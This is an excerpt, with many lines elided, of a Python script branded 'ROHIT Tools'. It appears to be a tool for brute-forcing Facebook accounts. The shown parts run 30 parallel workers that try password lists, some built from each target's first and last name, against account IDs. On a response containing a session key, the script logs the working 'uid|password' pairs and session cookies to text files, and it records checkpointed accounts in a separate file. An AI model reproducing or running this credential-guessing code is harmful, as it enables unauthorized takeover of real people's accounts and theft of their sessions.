...
try:
	...
	os.system('python ROHIT.py')
os.system("clear")
print('\n\033[1;32m Loading ROHIT Tools...')
...
logo=("""\033[                                           '                                           '                                                                              '                                                                                          '                                                                        
 ...
 .·´/\                ,..:´:::'/)::::..::::(  .·´/\                ,...__ ¯¯¯` ·:·´’                                     .·´/\                ,...__ ¯¯¯` ·:·´’):.::/\                        ¯¯¯` · ::·´’  .·´/\                ,..:´:::::'/ `  · :/;·´        )..:::·´      ,..:´:::'/' .·´/\                   ,.. : ´:::'/:’ ’
  ...
  (`·.)':/       /:::/      /::/      /              /       ,, -,      \::::::/    '                                               /       ,, -,      \::::::/    '             /      /¯¯¯¯¯'I/       /''                /        ,...-:::: ´'/       '/   '     (`·.)':/       /             '     (`·.)':/       /'                    
   ...
   '\:/       /   /      /  /      /        _) ::/       '/;;:/::::'\      '\          ’'                                   _) ::/       '/;;:/::::'\      '\          ’'       /I      'I         /       /'      '    _) ::/____/;;::::: - ´ /        /      ’     '\:/       /                  '    '\:/       /'                       
    /____/   /      '/  /      /         )..::/       /    '\::::::'\      '\                                            )..::/       /    '\::::::'\      '\              /::/`· ,    ` ·,_'/       /’            `·:::/:::::::/.  - ··  ´´       .·´/    '         /       /                         /       /'                 '       
   /:::::-  ´´  ,  - ´´´     .·´'/          `·:/____ /       '\::::::\____\                                          `·:/____ /       '\::::::\____\           I:/::::::::` · , ___,.·:/'             '   )/::; - '          ..-:::::'/:::/       '     '/,..::·´/                     '   '/,..::·´/'                          
 /::`*..¸..-:/:`*..¸..-::::::::/            /::::::::/           '\::::/:::::::/                                           /::::::::/           '\::::/:::::::/            `·:;::::::::::/:::::/:::/'      '            ¯/::`*..¸..-::::::::::::/:·´            ' '/:::::::/                      ' '/:::::::'/                            
/:::::::/::/:::::::/::::::::- ´´           '/::::::::/              '\/:::::::'/     '                                      /::::::::/              '\/:::::::'/     '             ` ·:;:::/:::::/;·´'             '       /:::::::/::::::::::-·· ´´               ' /:;:: · ´                        /:;:: · ´'                       '      
`*-::;/::::`*-::;/::::-·· ´´               ¯¯¯¯¯                 ¯¯¯¯          ’1;37m 
----------------------------------------------
\033[1;32m•\033[1;37m CREATED BY  \033[1;32m •√\033[1;37m  MR. ROHIT
\033[1;32m•\033[1;37m FACEBOOK    \033[1;32m •√\033[1;37m  MR ROHIT
\033[1;32m•\033[1;37m FRIENDS     \033[1;32m •√\033[1;37m  DEVIL  👿 
\033[1;32m•\033[1;37m TOOLS       \033[1;32m •√\033[1;37m  FREE HAIN [ KYUNKI TESTING PR HAIN ]
...
#	print('\033[1;37m example :\033[1;37mfirst last, firtslast, first123')
	...
	with tred(max_workers=30) as ROHIT:
		clear()
		tl = str(len(fo))
		...
		for user in fo:
			...
			passlist = plist
			if methd =='1':
				ROHIT.submit(api1,ids,names,passlist)
			else:
				ROHIT.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[ROHIT]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m[ROHIT-OK] '+uid+' | '+pas)
						#print(' \33[1;96m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'ROHIT_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'ROHIT_COOKIES.txt')
						...
						#print(f'\r\r\33[1m\33[1;35m [ROHIT-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'ROHIT-CP.txt')
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[ROHIT-M1]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m [ROHIT-OK] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'ROHIT_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
